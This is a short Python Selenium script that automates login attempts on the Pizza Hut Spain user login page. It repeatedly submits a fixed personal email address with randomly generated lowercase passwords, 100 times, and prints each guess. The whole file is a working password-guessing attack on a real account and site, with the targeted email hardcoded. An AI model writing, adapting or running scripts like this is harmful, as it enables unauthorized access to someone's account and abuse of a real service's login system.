import time
import string
import random

PATH = "C:\Selenium\chromedriver.exe"
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver = webdriver.Chrome(PATH)
driver.get("https://www.pizzahut.es/usuario/inicio")
time.sleep(2)

letters = string.ascii_lowercase
for x in range(100):
    user = driver.find_element_by_name("EmailLogin")
    user.clear()
    user.send_keys("seba-garrido@hotmail.com")  

    password = driver.find_element_by_name("PasswordLogin")
    str = ''.join(random.choice(letters) for i in range(4,10))
    password.send_keys(str)

    print(str)
    register = driver.find_element_by_xpath("/html/body/div[4]/div[1]/div[2]/div[3]/div[1]/form/button").click()
    time.sleep(2)
    close = driver.find_element_by_xpath("/html/body/div[7]/div[1]/div[1]/a").click()
    time.sleep(2)